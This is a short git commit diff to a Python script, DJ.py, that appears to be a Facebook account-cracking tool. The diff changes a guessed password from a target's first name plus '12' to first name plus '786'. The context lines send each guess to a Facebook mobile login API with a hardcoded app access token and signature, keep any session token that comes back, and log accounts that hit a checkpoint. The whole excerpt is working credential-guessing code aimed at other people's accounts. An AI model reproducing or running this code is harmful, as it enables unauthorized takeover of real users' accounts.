a5720c2b8fbc4ae17a6f62939b589d7a1dbb67d2
DJ <60933514+FAKHAR143@users.noreply.github.com>
2020-03-07 10:50:47 +0500

    Update DJ.py

--- DJ.py
+++ DJ.py
@@ -335,7 +335,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '12'
+											pass5 = b['first_name'] + '786'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
